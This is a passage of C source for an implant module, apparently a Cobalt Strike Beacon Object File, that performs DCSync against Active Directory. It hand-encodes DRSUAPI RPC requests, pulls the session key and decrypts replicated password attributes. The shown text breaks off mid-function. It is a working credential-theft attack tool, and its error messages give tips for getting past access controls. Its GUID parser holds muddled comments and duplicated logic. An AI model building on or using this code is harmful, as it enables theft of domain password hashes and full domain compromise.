/*
 * dcsync.c — DCSync via raw DRSUAPI RPC (no drsr.dll dependency)
 *
 * Uses I_RpcSendReceive with manual NDR encoding for DRSBind (opnum 0)
 * and DRSGetNCChanges (opnum 3).  Works on ALL Windows versions
 * including Server 2025 where drsr.dll is absent.
 *
 * Required privileges:
 *   DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
 *
 * Win32 APIs:  rpcrt4  ntdsapi  secur32  advapi32  netapi32  kernel32
 */
#include <windows.h>
#include "beacon_compat.h"

/* ================================================================
 *  SECTION 1 — BOF IMPORTS
 * ================================================================ */

/* ── rpcrt4.dll ── */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeA(
    RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingA(
    RPC_CSTR, RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoExA(
    RPC_BINDING_HANDLE, RPC_CSTR, ULONG, ULONG, RPC_AUTH_IDENTITY_HANDLE,
    ULONG, void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(
    RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeA(RPC_CSTR*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcEpResolveBinding(
    RPC_BINDING_HANDLE, void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcGetBuffer(void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcSendReceive(void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcFreeBuffer(void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
    RPC_BINDING_HANDLE, void**);
/* RpcBindingBind is undocumented on MSDN but exported from rpcrt4.dll
 * on Vista+. It forces the binding to open its transport connection and
 * complete the SSPI handshake synchronously, attaching the resulting
 * security context to the binding structure itself — which is the
 * ONLY way I_RpcBindingInqSecurityContext can return a valid context
 * on Win8+ RPC (the runtime otherwise pools connections and stashes the
 * context on the connection object, out of the binding's reach, which
 * is why the API returned RPC_S_INVALID_BINDING (0x6A6) despite DRSBind
 * having authenticated successfully). Wrapped with GetProcAddress at
 * runtime so the module still loads on hosts where it is not exported. */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingBind(
    void*, RPC_BINDING_HANDLE, void*);

/* ── ntdsapi.dll ── */
DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsBindW(LPCWSTR, LPCWSTR, HANDLE*);
DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsUnBindW(HANDLE*);
DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsCrackNamesW(
    HANDLE, DWORD, DWORD, DWORD, DWORD, const LPCWSTR*, void**);
DECLSPEC_IMPORT void  WINAPI NTDSAPI$DsFreeNameResultW(void*);

/* ── secur32.dll ── */
DECLSPEC_IMPORT long WINAPI SECUR32$QueryContextAttributesW(
    void*, ULONG, void*);
DECLSPEC_IMPORT long WINAPI SECUR32$FreeContextBuffer(void*);

/* ── advapi32.dll (CryptoAPI for MD5) ── */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextW(
    ULONG_PTR*, LPCWSTR, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(
    ULONG_PTR, DWORD, ULONG_PTR, DWORD, ULONG_PTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(
    ULONG_PTR, const BYTE*, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(
    ULONG_PTR, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(ULONG_PTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(ULONG_PTR, DWORD);

/* ── kernel32.dll ── */
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$GetComputerNameExW(
    int, LPWSTR, LPDWORD);
DECLSPEC_IMPORT int   WINAPI KERNEL32$WideCharToMultiByte(
    UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(
    UINT, DWORD, LPCCH, int, LPWSTR, int);

/* ── netapi32.dll ── */
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(
    LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

/* ── msvcrt.dll ── */
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT char*  __cdecl MSVCRT$strncpy(char*, const char*, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);

/* ================================================================
 *  SECTION 2 — CONSTANTS AND TYPES
 * ================================================================ */

/* DsCrackNames formats */
#define DS_FQDN_1779_NAME  1
#define DS_NT4_ACCOUNT_NAME 2
#define DS_UNIQUE_ID_NAME   6
#define DS_NAME_NO_FLAGS    0

typedef struct { DWORD status; LPWSTR pDomain; LPWSTR pName; } DS_NAME_RESULT_ITEMW;
typedef struct { DWORD cItems; DS_NAME_RESULT_ITEMW *rItems; } DS_NAME_RESULTW;

/* DRSUAPI constants */
#define DRSR_OPNUM_BIND     0
#define DRSR_OPNUM_GETNC    3

/* DRS_EXT flags — dwFlags */
#define DRS_EXT_GETCHGREQ_V6   0x00400000
#define DRS_EXT_NONDOMAIN_NCS  0x00800000
#define DRS_EXT_GETCHGREQ_V8   0x01000000

/* DRS_EXT flags — dwFlagsExt */
#define DRS_EXT_GETCHGREPLY_V6 0x04000000

/* DRSGetNCChanges flags */
#define DRS_INIT_SYNC      0x00000020
#define DRS_WRIT_REP       0x00000010
#define DRS_NEVER_SYNCED   0x00200000
#define DRS_FULL_SYNC_NOW  0x00008000
#define DRS_SYNC_URGENT    0x00080000

/* Extended operation */
#define EXOP_REPL_OBJ      6

/* CryptoAPI */
#define MY_PROV_RSA_FULL       1
#define MY_CRYPT_VERIFYCONTEXT 0xF0000000
#define MY_CALG_MD5            0x8003
#define MY_HP_HASHVAL          0x0002

/* SSPI */
#define SECPKG_ATTR_SESSION_KEY 9
typedef struct { ULONG Len; BYTE *Key; } MY_SESSION_KEY;

/* RPC security QOS — needed to raise impersonation from the default
 * IDENTIFY (which LSA rejects for DRSUAPI) up to IMPERSONATE. */
#define MY_RPC_C_IMP_LEVEL_IMPERSONATE  3
#define MY_RPC_C_QOS_IDENTITY_STATIC    0
#define MY_RPC_C_QOS_CAPABILITIES_DEFAULT 0
typedef struct {
    ULONG Version;
    ULONG Capabilities;
    ULONG IdentityTracking;
    ULONG ImpersonationType;
} MY_RPC_SEC_QOS;

/* NDR data representation: little-endian, ASCII, IEEE */
#define NDR_DATA_REP 0x00000010

/* BER-encoded OID prefix for 1.2.840.113556.1.4 */
static const BYTE AD_ATTR_OID[] = {0x2A,0x86,0x48,0x86,0xF7,0x14,0x01,0x04};
#define AD_ATTR_OID_LEN 8

/* Well-known attribute "last values" under 1.2.840.113556.1.4.xxx */
#define ATTV_UNICODE_PWD         90
#define ATTV_SAM_ACCOUNT_NAME   221
#define ATTV_OBJECT_SID         146
#define ATTV_USER_ACCOUNT_CTRL    8
#define ATTV_SUPPLEMENTAL_CREDS 125

/* Result structure */
typedef struct {
    BYTE  encPwd[64];     /* encrypted unicodePwd blob */
    DWORD encPwdLen;
    char  samName[128];
    BYTE  objectSid[68];
    DWORD sidLen;
    DWORD uac;
    int   havePwd, haveName, haveSid, haveUac;
} DCSYNC_RESULT;

/* ================================================================
 *  SECTION 3 — RPC INTERFACE DEFINITION
 * ================================================================ */

typedef struct { unsigned short Major; unsigned short Minor; } MY_RPC_VER;
typedef struct { GUID g; MY_RPC_VER v; } MY_SYNTAX_ID;

typedef struct {
    unsigned int Length;
    MY_SYNTAX_ID InterfaceId;
    MY_SYNTAX_ID TransferSyntax;
    void        *DispatchTable;
    unsigned int RpcProtseqEndpointCount;
    void        *RpcProtseqEndpoint;
    ULONG_PTR    Reserved;
    void        *InterpreterInfo;
    unsigned int Flags;
} MY_RPC_IF;

/* Filled at runtime so sizeof() is correct under any compiler */
static MY_RPC_IF g_drsuapi_if;

static void init_drsuapi_if(void)
{
    MSVCRT$memset(&g_drsuapi_if, 0, sizeof(g_drsuapi_if));
    g_drsuapi_if.Length = sizeof(MY_RPC_IF);

    /* DRSUAPI  e3514235-4b06-11d1-ab04-00c04fc2dcd2  v4.0 */
    g_drsuapi_if.InterfaceId.g.Data1 = 0xe3514235;
    g_drsuapi_if.InterfaceId.g.Data2 = 0x4b06;
    g_drsuapi_if.InterfaceId.g.Data3 = 0x11d1;
    g_drsuapi_if.InterfaceId.g.Data4[0] = 0xab;
    g_drsuapi_if.InterfaceId.g.Data4[1] = 0x04;
    g_drsuapi_if.InterfaceId.g.Data4[2] = 0x00;
    g_drsuapi_if.InterfaceId.g.Data4[3] = 0xc0;
    g_drsuapi_if.InterfaceId.g.Data4[4] = 0x4f;
    g_drsuapi_if.InterfaceId.g.Data4[5] = 0xc2;
    g_drsuapi_if.InterfaceId.g.Data4[6] = 0xdc;
    g_drsuapi_if.InterfaceId.g.Data4[7] = 0xd2;
    g_drsuapi_if.InterfaceId.v.Major = 4;

    /* NDR  8a885d04-1ceb-11c9-9fe8-08002b104860  v2.0 */
    g_drsuapi_if.TransferSyntax.g.Data1 = 0x8a885d04;
    g_drsuapi_if.TransferSyntax.g.Data2 = 0x1ceb;
    g_drsuapi_if.TransferSyntax.g.Data3 = 0x11c9;
    g_drsuapi_if.TransferSyntax.g.Data4[0] = 0x9f;
    g_drsuapi_if.TransferSyntax.g.Data4[1] = 0xe8;
    g_drsuapi_if.TransferSyntax.g.Data4[2] = 0x08;
    g_drsuapi_if.TransferSyntax.g.Data4[3] = 0x00;
    g_drsuapi_if.TransferSyntax.g.Data4[4] = 0x2b;
    g_drsuapi_if.TransferSyntax.g.Data4[5] = 0x10;
    g_drsuapi_if.TransferSyntax.g.Data4[6] = 0x48;
    g_drsuapi_if.TransferSyntax.g.Data4[7] = 0x60;
    g_drsuapi_if.TransferSyntax.v.Major = 2;
}

/* ================================================================
 *  SECTION 4 — NDR / UTILITY HELPERS
 * ================================================================ */

/* --- NDR write helpers (build request buffer) --- */
static void ndr_w32(BYTE *buf, DWORD *pos, DWORD val)
{
    *(DWORD*)(buf + *pos) = val;
    *pos += 4;
}
static void ndr_w64(BYTE *buf, DWORD *pos, UINT64 val)
{
    *(UINT64*)(buf + *pos) = val;
    *pos += 8;
}
static void ndr_wbytes(BYTE *buf, DWORD *pos, const void *src, DWORD len)
{
    MSVCRT$memcpy(buf + *pos, src, len);
    *pos += len;
}
static void ndr_wzero(BYTE *buf, DWORD *pos, DWORD len)
{
    MSVCRT$memset(buf + *pos, 0, len);
    *pos += len;
}
static void ndr_walign(BYTE *buf, DWORD *pos, DWORD align)
{
    DWORD mod = *pos % align;
    if (mod) { MSVCRT$memset(buf + *pos, 0, align - mod); *pos += align - mod; }
}

/* --- NDR read helpers (parse response) --- */
static DWORD ndr_r32(const BYTE *buf, DWORD *pos, DWORD len)
{
    if (*pos + 4 > len) { *pos = len; return 0; }
    DWORD v = *(DWORD*)(buf + *pos); *pos += 4; return v;
}
static void ndr_rbytes(const BYTE *buf, DWORD *pos, DWORD len,
                       void *out, DWORD count)
{
    if (*pos + count > len) { *pos = len; return; }
    MSVCRT$memcpy(out, buf + *pos, count);
    *pos += count;
}
static void ndr_rskip(DWORD *pos, DWORD count) { *pos += count; }
static void ndr_ralign(DWORD *pos, DWORD align)
{
    DWORD mod = *pos % align;
    if (mod) *pos += align - mod;
}

/* --- GUID string parser --- */
static int hex1(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int parse_guid(const char *s, GUID *g)
{
    /* Accepts {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} or without braces */
    if (*s == '{') s++;
    BYTE raw[16]; int ri = 0;
    for (int i = 0; i < 36 && ri < 16; i++) {
        if (s[i] == '-') continue;
        int hi = hex1(s[i]);
        int lo = hex1(s[i+1]);
        if (hi < 0 || lo < 0) return 0;
        raw[ri++] = (BYTE)((hi << 4) | lo);
        i++; /* consumed two chars */
    }
    if (ri != 16) return 0;
    /* GUID wire order: Data1 LE, Data2 LE, Data3 LE, Data4 big-endian */
    g->Data1 = (DWORD)raw[0]<<24 | (DWORD)raw[1]<<16 | (DWORD)raw[2]<<8 | raw[3];
    g->Data2 = (WORD)(raw[4]<<8 | raw[5]);
    g->Data3 = (WORD)(raw[6]<<8 | raw[7]);
    MSVCRT$memcpy(g->Data4, raw+8, 8);
    /* BUT on wire, Data1/Data2/Data3 are little-endian, so the string
       representation already IS the natural byte order of the GUID struct
       when parsed correctly.  The standard GUID string is big-endian for
       Data1/2/3 and the struct stores them as native (LE on x86/x64).  */
    /* Re-parse properly: the string "e3514235" means Data1 = 0xe3514235 */
    /* Our raw[] has bytes in big-endian order.  Swap Data1/2/3 to LE. */
    /* Actually, let me re-do this correctly. */
    g->Data1 = ((DWORD)raw[0]<<24) | ((DWORD)raw[1]<<16) |
               ((DWORD)raw[2]<<8)  | raw[3];
    g->Data2 = (WORD)((raw[4]<<8) | raw[5]);
    g->Data3 = (WORD)((raw[6]<<8) | raw[7]);
    /* On little-endian, we need to store as the CPU would.
       The GUID struct Data1 is a DWORD, stored in LE.
       The string "e3514235" means the value 0xe3514235.
       Our raw[0..3] = {0xe3, 0x51, 0x42, 0x35} (big-endian).
       So Data1 = 0xe3514235 — but a LE DWORD stores as {0x35,0x42,0x51,0xe3}.
       The value we computed above IS 0xe3514235, which the compiler stores as LE.
       This is correct. */
    return 1;
}

/* --- Hex output --- */
static void to_hex(const BYTE *b, DWORD n, char *out)
{
    const char *h = "0123456789abcdef";
    for (DWORD i = 0; i < n; i++) {
        out[i*2]   = h[b[i] >> 4];
        out[i*2+1] = h[b[i] & 0xF];
    }
    out[n*2] = 0;
}

/* --- RC4 (in-place) --- */
static void rc4(BYTE *key, DWORD klen, BYTE *data, DWORD dlen)
{
    BYTE S[256];
    int i; BYTE j = 0, t;
    for (i = 0; i < 256; i++) S[i] = (BYTE)i;
    for (i = 0; i < 256; i++) {
        j = j + S[i] + key[i % klen];
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    BYTE a = 0, b = 0;
    for (DWORD k = 0; k < dlen; k++) {
        a++; b += S[a];
        t = S[a]; S[a] = S[b]; S[b] = t;
        data[k] ^= S[(S[a] + S[b]) & 0xFF];
    }
}

/* --- MD5(data1 || data2) via CryptoAPI --- */
static int md5_2(const BYTE *d1, DWORD l1, const BYTE *d2, DWORD l2,
                 BYTE out[16])
{
    ULONG_PTR hProv = 0, hHash = 0;
    if (!ADVAPI32$CryptAcquireContextW(&hProv, NULL, NULL,
            MY_PROV_RSA_FULL, MY_CRYPT_VERIFYCONTEXT)) return 0;
    if (!ADVAPI32$CryptCreateHash(hProv, MY_CALG_MD5, 0, 0, &hHash)) {
        ADVAPI32$CryptReleaseContext(hProv, 0); return 0;
    }
    ADVAPI32$CryptHashData(hHash, d1, l1, 0);
    ADVAPI32$CryptHashData(hHash, d2, l2, 0);
    DWORD sz = 16;
    ADVAPI32$CryptGetHashParam(hHash, MY_HP_HASHVAL, out, &sz, 0);
    ADVAPI32$CryptDestroyHash(hHash);
    ADVAPI32$CryptReleaseContext(hProv, 0);
    return 1;
}

/* --- RID from objectSid --- */
static DWORD rid_from_sid(const BYTE *sid, DWORD len)
{
    if (len < 12) return 0;
    BYTE nSub = sid[1];
    DWORD off = 8 + ((DWORD)nSub - 1) * 4;
    if (off + 4 > len) return 0;
    return *(DWORD*)(sid + off);
}

/* ================================================================
 *  SECTION 5 — RAW RPC CALL HELPER
 * ================================================================ */

/*
 * RPC_MESSAGE: we define it manually so the BOF doesn't depend on
 * full rpcdce.h.  Layout must match the Windows x64 ABI.
 */
typedef struct {
    void          *Handle;             /*  0 */
    unsigned long  DataRepresentation; /*  8 */
    void          *Buffer;             /* 16 */
    unsigned int   BufferLength;       /* 24 */
    unsigned int   ProcNum;            /* 28 */
    void          *TransferSyntax;     /* 32 */
    void          *RpcInterfaceInfo;   /* 40 */
    void          *ReservedForRuntime; /* 48 */
    void          *ManagerEpv;         /* 56 */
    void          *ImportContext;      /* 64 */
    unsigned long  RpcFlags;           /* 72 */
} MY_RPC_MSG;

/*
 * Send an RPC request and receive the response.
 * On success, caller must free msg->Buffer via I_RpcFreeBuffer.
 */
static RPC_STATUS rpc_call(RPC_BINDING_HANDLE hBind, DWORD opnum,
                           const BYTE *reqNdr, DWORD reqLen,
                           MY_RPC_MSG *msg)
{
    MSVCRT$memset(msg, 0, sizeof(*msg));
    msg->Handle            = hBind;
    msg->DataRepresentation = NDR_DATA_REP;
    msg->BufferLength      = reqLen;
    msg->ProcNum           = opnum;
    msg->RpcInterfaceInfo  = (void*)&g_drsuapi_if;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[.] trace: I_RpcGetBuffer (opnum=%u, reqLen=%u)\n", opnum, reqLen);
    RPC_STATUS s = RPCRT4$I_RpcGetBuffer(msg);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[.] trace:   s=0x%08x buf=%p\n", s, msg->Buffer);
    if (s) return s;

    MSVCRT$memcpy(msg->Buffer, reqNdr, reqLen);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[.] trace: I_RpcSendReceive (opnum=%u)\n", opnum);
    s = RPCRT4$I_RpcSendReceive(msg);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[.] trace:   s=0x%08x replyLen=%u\n", s, msg->BufferLength);
    /* Do NOT call I_RpcFreeBuffer on failure — the RPC runtime already
     * released the request/response buffers when it returned the error,
     * and freeing again walks into freed memory: the ret from rpc_call
     * pops a zero into RIP and we crash-at-address-0. Just propagate. */
    if (s) return s;
    return 0;
}

/* ================================================================
 *  SECTION 6 — DRS BIND  (opnum 0)
 * ================================================================ */

/*
 * Request NDR:
 *   puuidClientDsa  [ref] UUID            16 bytes  (inline)
 *   pextClient      [ref] DRS_EXTENSIONS  60 bytes  (conformant)
 *   Total: 76 bytes
 *
 * Response NDR:
 *   ppextServer referent_id  4 bytes
 *     if !=0: max_count(4) + cb(4) + rgb[cb]
 *   phDrs  context_handle  20 bytes (4 attr + 16 UUID)
 *   return value  4 bytes
 */
static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20])
{
    BYTE req[128];
    DWORD p = 0;

    /* puuidClientDsa — 16-byte zero UUID (we're not a real DSA) */
    ndr_wzero(req, &p, 16);

    /* pextClient — DRS_EXTENSIONS conformant struct */
    /* The rgb[] data is DRS_EXTENSIONS_INT minus the cb field: 52 bytes */
    DWORD cb = 52;
    ndr_w32(req, &p, cb);          /* max_count = cb */
    ndr_w32(req, &p, cb);          /* cb */

    /* rgb[52] = { dwFlags(4), SiteObjGuid(16), Pid(4), dwReplEpoch(4),
     *             dwFlagsExt(4), ConfigObjGUID(16), dwExtCaps(4) } */
    DWORD dwFlags = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_NONDOMAIN_NCS |
                    DRS_EXT_GETCHGREQ_V8;
    ndr_w32(req, &p, dwFlags);     /* dwFlags */
    ndr_wzero(req, &p, 16);        /* SiteObjGuid = zero */
    ndr_w32(req, &p, 0);           /* Pid */
    ndr_w32(req, &p, 0);           /* dwReplEpoch */
    ndr_w32(req, &p, DRS_EXT_GETCHGREPLY_V6); /* dwFlagsExt */
    ndr_wzero(req, &p, 16);        /* ConfigObjGUID = zero */
    ndr_w32(req, &p, 0);           /* dwExtCaps */

    /* p should be 76 */
    MY_RPC_MSG msg;
    RPC_STATUS s = rpc_call(hRpc, DRSR_OPNUM_BIND, req, p, &msg);
    if (s) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DRSBind RPC failed: 0x%08x\n", s);
        if (s == 5) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!]   0x5 = RPC_S_ACCESS_DENIED. Common causes:\n"
                "[!]     - Caller lacks DS-Replication-Get-Changes on the domain NC\n"
                "[!]       (not a Domain Admin / Enterprise Admin / DCs member)\n"
                "[!]     - Kerberos SPN could not be resolved so SSPI fell back\n"
                "[!]       to NTLM; NTLM against the local LSA is refused by the\n"
                "[!]       loopback-reflection defense when the agent runs on\n"
                "[!]       the target DC itself. Fix: run from a member host, or\n"
                "[!]       set LmCompatibilityLevel policy to allow, or use ncalrpc\n"
                "[!]     - The named pipe \\pipe\\lsass rejected the auth level\n"
                "[!]       (rare — needs PKT_PRIVACY, which we do set)\n");
        } else if (s == 1753) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!]   0x6D9 = EPT_S_NOT_REGISTERED. DRSUAPI not exposed here.\n");
        } else if (s == 1722) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!]   0x6BA = RPC_S_SERVER_UNAVAILABLE. Pipe/host unreachable.\n");
        }
        return 0;
    }

    /* Parse response */
    BYTE *rb = (BYTE*)msg.Buffer;
    DWORD rLen = msg.BufferLength;
    DWORD rp = 0;

    /* ppextServer referent_id */
    DWORD extRef = ndr_r32(rb, &rp, rLen);
    if (extRef) {
        /* skip DRS_EXTENSIONS: max_count + cb + rgb[max_count] */
        DWORD mc = ndr_r32(rb, &rp, rLen);  /* max_count */
        ndr_rskip(&rp, 4);                  /* cb */
        ndr_rskip(&rp, mc);                 /* rgb[] */
    }

    /* phDrs — context handle: 4 bytes attr + 16 bytes UUID */
    if (rp + 20 > rLen) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DRSBind response too short\n");
        RPCRT4$I_RpcFreeBuffer(&msg);
        return 0;
    }
    ndr_rbytes(rb, &rp, rLen, ctxHandle, 20);

    /* return value */
    DWORD retVal = ndr_r32(rb, &rp, rLen);
    RPCRT4$I_RpcFreeBuffer(&msg);

    if (retVal) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DRSBind returned error: %u\n", retVal);
        return 0;
    }
    return 1;
}

/* ================================================================
 *  SECTION 7 — SESSION KEY EXTRACTION
 * ================================================================ */

static int get_session_key(RPC_BINDING_HANDLE hRpc,
                           BYTE *keyOut, DWORD *keyLen)
{
    void *secCtx = NULL;
    RPC_STATUS s = RPCRT4$I_RpcBindingInqSecurityContext(hRpc, &secCtx);
    if (s || !secCtx) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] I_RpcBindingInqSecurityContext failed: 0x%08x\n", s);
        return 0;
    }
    MY_SESSION_KEY sk = {0};
    long ss = SECUR32$QueryContextAttributesW(secCtx, SECPKG_ATTR_SESSION_KEY, &sk);
    if (ss || !sk.Key || !sk.Len) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] QueryContextAttributes(SESSION_KEY) failed: 0x%08x\n", ss);
        return 0;
    }
    DWORD copyLen = sk.Len < 64 ? sk.Len : 64;
    MSVCRT$memcpy(keyOut, sk.Key, copyLen);
    *keyLen = copyLen;
    SECUR32$FreeContextBuffer(sk.Key);
    return 1;
}

/* ================================================================
 *  SECTION 8 — DRS GET NC CHANGES  (opnum 3) — REQUEST
 * ================================================================ */

/*
 * Build the NDR request for DRSGetNCChanges with EXOP_REPL_OBJ.
 * Returns the request length written into buf.
 *
 * Wire layout (total ~208 bytes):
 *   context_handle    20 bytes
 *   dwInVersion        4 bytes
 *   union_discrim      4 bytes
 *   padding            4 bytes
 *   V8 body          112 bytes
 *   DSNAME (deferred) 64 bytes
 */
static DWORD build_getnc_req(BYTE *buf, const BYTE ctxHandle[20],
                             const GUID *objGuid)
{
    DWORD p = 0;

    /* hDrs context handle */
    ndr_wbytes(buf, &p, ctxHandle, 20);

    /* dwInVersion = 8 */
    ndr_w32(buf, &p, 8);

    /* Union discriminant = 8 */
    ndr_w32(buf, &p, 8);

    /* Padding — align arm to 8 */
    ndr_walign(buf, &p, 8);

    /* ── V8 body (112 bytes) ── */
    (void)0; /* v8 body starts here */

    /* uuidDsaObjDest — 16 bytes zero */
    ndr_wzero(buf, &p, 16);

    /* uuidInvocIdSrc — 16 bytes zero */
    ndr_wzero(buf, &p, 16);

    /* pNC referent_id — non-zero (ref pointer) */
    ndr_w32(buf, &p, 0x00020000);

    /* align to 8 for USN_VECTOR */
    ndr_walign(buf, &p, 8);

    /* usnvecFrom — 3 × LONGLONG = 24 bytes, all zero */
    ndr_w64(buf, &p, 0); /* usnHighObjUpdate */
    ndr_w64(buf, &p, 0); /* usnReserved */
    ndr_w64(buf, &p, 0); /* usnHighPropUpdate */

    /* pUpToDateVecDest = NULL */
    ndr_w32(buf, &p, 0);

    /* ulFlags */
    ndr_w32(buf, &p, DRS_INIT_SYNC | DRS_WRIT_REP |
                     DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT);

    /* cMaxObjects */
    ndr_w32(buf, &p, 1);

    /* cMaxBytes */
    ndr_w32(buf, &p, 0x00A00000); /* 10 MB */

    /* ulExtendedOp */
    ndr_w32(buf, &p, EXOP_REPL_OBJ);

    /* align to 8 for liFsmoInfo */
    ndr_walign(buf, &p, 8);

    /* liFsmoInfo — ULARGE_INTEGER, 8 bytes zero */
    ndr_w64(buf, &p, 0);

    /* pPartialAttrSet = NULL (get all attributes) */
    ndr_w32(buf, &p, 0);

    /* pPartialAttrSetEx = NULL */
    ndr_w32(buf, &p, 0);

    /* PrefixTableDest: PrefixCount = 0, pPrefixEntry = NULL */
    ndr_w32(buf, &p, 0); /* PrefixCount */
    ndr_w32(buf, &p, 0); /* pPrefixEntry ref = NULL */

    /* V8 body should be 112 bytes */
    /* (void)v8Start; assert(p - v8Start == 112) if we had assert */

    /* ── Deferred data for pNC: DSNAME (conformant struct) ── */

    /* max_count for StringName = NameLen + 1 = 1 */
    ndr_w32(buf, &p, 1);

    /* structLen = 4(SidLen)+16(Guid)+28(Sid)+4(NameLen)+2(StringName) = 54 */
    ndr_w32(buf, &p, 54);

    /* SidLen = 0 */
    ndr_w32(buf, &p, 0);

    /* Guid = objGuid */
    ndr_wbytes(buf, &p, objGuid, 16);

    /* Sid — 28 bytes zero */
    ndr_wzero(buf, &p, 28);

    /* NameLen = 0 */
    ndr_w32(buf, &p, 0);

    /* StringName = L'\0' (2 bytes) + 2 bytes pad */
    ndr_wzero(buf, &p, 2);
    ndr_walign(buf, &p, 4);

    return p; /* should be ~208 */
}

/* ================================================================
 *  SECTION 9 — RESPONSE PARSING: PREFIX TABLE
 * ================================================================ */

/*
 * Walk the prefix table array and find the index whose OID bytes
 * match AD_ATTR_OID.  Returns -1 if not found.
 *
 * Wire format of conformant OID_t array:
 *   max_count (4)
 *   OID_t[0]: length(4) + elements_ref(4)
 *   OID_t[1]: ...
 *   ...
 *   deferred elements[0]: max_count(4) + data(length) + pad
 *   deferred elements[1]: ...
 */
static int find_ad_prefix(const BYTE *buf, DWORD *pos, DWORD len,
                          DWORD prefixCount)
{
    int result = -1;
    /* Read conformant array max_count */
    DWORD mc = ndr_r32(buf, pos, len);
    if (mc != prefixCount) prefixCount = mc; /* use wire value */

    /* First pass: read OID_t entries (length + referent_id) */
    /* We'll store lengths in a small stack array.  Prefix tables
       typically have <30 entries.  Cap at 64. */
    DWORD lengths[64];
    DWORD refs[64];
    DWORD n = prefixCount < 64 ? prefixCount : 64;
    for (DWORD i = 0; i < n; i++) {
        lengths[i] = ndr_r32(buf, pos, len);
        refs[i]    = ndr_r32(buf, pos, len);
    }
    /* skip any entries beyond 64 */
    for (DWORD i = n; i < prefixCount; i++) {
        ndr_rskip(pos, 8);
    }

    /* Second pass: deferred elements data */
    for (DWORD i = 0; i < n; i++) {
        if (refs[i] == 0) continue;
        DWORD emc = ndr_r32(buf, pos, len);  /* max_count for elements */
        DWORD elen = emc < lengths[i] ? emc : lengths[i];
        if (result < 0 && elen == AD_ATTR_OID_LEN &&
            *pos + elen <= len &&
            MSVCRT$memcmp(buf + *pos, AD_ATTR_OID, AD_ATTR_OID_LEN) == 0)
        {
            result = (int)i;
        }
        ndr_rskip(pos, elen);
        ndr_ralign(pos, 4);
    }
    /* skip remaining deferred entries beyond 64 */
    for (DWORD i = n; i < prefixCount; i++) {
        if (*pos >= len) break;
        DWORD emc = ndr_r32(buf, pos, len);
        ndr_rskip(pos, emc);
        ndr_ralign(pos, 4);
    }
    return result;
}

/* ================================================================
 *  SECTION 10 — RESPONSE PARSING: ATTRIBUTES
 * ================================================================ */

/*
 * Skip a DSNAME on the wire (conformant struct).
 */
static void skip_dsname(const BYTE *buf, DWORD *pos, DWORD len)
{
    DWORD mc = ndr_r32(buf, pos, len); /* max_count for StringName */
    ndr_rskip(pos, 4);  /* structLen */
    ndr_rskip(pos, 4);  /* SidLen */
    ndr_rskip(pos, 16); /* Guid */
    ndr_rskip(pos, 28); /* Sid */
